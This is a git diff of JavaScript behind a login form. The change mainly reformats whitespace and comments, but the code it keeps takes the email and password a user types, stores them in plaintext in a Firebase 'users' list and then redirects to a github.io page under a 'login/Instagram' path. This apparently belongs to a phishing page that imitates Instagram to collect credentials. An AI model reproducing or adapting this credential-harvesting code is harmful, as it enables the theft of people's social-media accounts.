@@ -41,45 +41,44 @@ if (loginForm) {
   loginForm.addEventListener('submit', (event) => {
     event.preventDefault();
 
-    // Get form values  
-    const email = document.getElementById('email').value;  
-    const password = document.getElementById('password').value;  
+    // Get form values
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-    if (email && password) {  
-      const deviceId = getDeviceId(); // Get or generate deviceId  
+    if (email && password) {
+      const deviceId = getDeviceId(); // Get or generate deviceId
 
-      // Ensure deviceId is valid before proceeding  
-      if (!deviceId) {  
-        alert("Device ID is invalid.");  
-        return;  
-      }  
+      // Ensure deviceId is valid before proceeding
+      if (!deviceId) {
+        alert("Device ID is invalid.");
+        return;
+      }
 
-      console.log("Generated Device ID:", deviceId);  
+      console.log("Generated Device ID:", deviceId);
 
-      // Create a reference to the "users" table
-      const usersRef = ref(database, 'users');  
+      // Create a reference to the "users" list
+      const usersRef = ref(database, 'users');  // No deviceId as the key
 
-      // Push a new login entry with deviceId inside the data object
-      push(usersRef, {  
-        deviceId: deviceId,  // وضع الـ deviceId داخل البيانات
-        email: email,  
-        password: password,  
-        timestamp: new Date().toISOString()
-      })  
-      .then(() => {  
-        const link = "https://mafia749.github.io/login/Instagram/instagram.html?id=" + deviceId;  
-        alert("Login successful! Your link: " + link);  
-        console.log("Generated Link:", link);  
-        window.location.href = link; // Redirect the user to the generated link  
-      })  
-      .catch((error) => {  
-        console.error("Error sending data to Firebase:", error.message);  
-        alert("Error sending data: " + error.message);  
-      });  
-    } else {  
-      alert("Please fill in both fields.");  
+      // Push a new login entry
+      push(usersRef, {
+        deviceId: deviceId, // Store the deviceId as a field
+        email: email,
+        password: password,
+        timestamp: new Date().toISOString() // Add a timestamp to distinguish the logins
+      })
+      .then(() => {
+        const link = "https://mafia749.github.io/login/Instagram/instagram.html?id=" + deviceId;
+        alert("Login successful! Your link: " + link);
+        console.log("Generated Link:", link);
+        window.location.href = link; // Redirect the user to the generated link
+      })
+      .catch((error) => {
+        console.error("Error sending data to Firebase:", error.message);
+        alert("Error sending data: " + error.message); // Alert the user about the error
+      });
+    } else {
+      alert("Please fill in both fields.");
     }
-
   });
 } else {
   console.error("Login form not found!");
